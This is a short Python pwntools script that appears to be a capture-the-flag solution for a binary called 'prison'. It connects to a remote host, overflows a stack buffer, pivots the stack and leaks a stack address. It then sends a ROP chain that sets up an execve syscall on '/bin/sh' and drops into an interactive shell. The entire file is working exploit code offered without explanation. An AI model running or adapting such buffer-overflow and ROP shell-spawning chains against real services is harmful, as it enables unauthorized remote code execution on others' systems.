from pwn import *
import time
exe = context.binary = ELF("./prison")
# r = process()
r = remote("20.84.72.194",5001)
offset = 56
wa_memory = 0x00000000004ccac0
new_stack = 0x00000000004cca80
pop_rbp = 0x0000000000401899
ret = 0x0000000000468aef
rop = ROP(exe)
print(len(b"/bin/sh\x00"))
rop.raw(b"/bin/sh\x00")
rop.raw(b"A" * offset)
rop.raw(wa_memory)
rop.raw(exe.sym['prison'] + 12)
rop.raw(ret)
rop.raw(new_stack)
r.sendline("11")
# time.sleep(15)
r.sendline(rop.chain())
r.sendline("1")
r.recvuntil(b"Your cellmate is ")
leak_stack = u64(r.recvline().strip() + b"\x00\x00")
log.info(f"Leak Stack {hex(leak_stack)}")
rop2 = ROP(exe)
rop2.raw(0x0000000000401a0d)
rop2.raw(0x4ccaa0)
rop2.raw(0x0000000000413676)
rop2.raw(0x0)
rop2.raw(b"/bin/sh\x00")
rop2.raw(0x0000000000401a1a)
rop2.raw(0x0)
rop.raw(0x000000000041a4b6)
rop2.raw(0x000000000041a4b6)
rop2.raw(0x4cca78)
print(len(rop2.chain()))
r.sendline(rop2.chain() + p64(0x000000000041f464) + p64(0x3b) + p64(0x0000000000401b54)) 
r.interactive()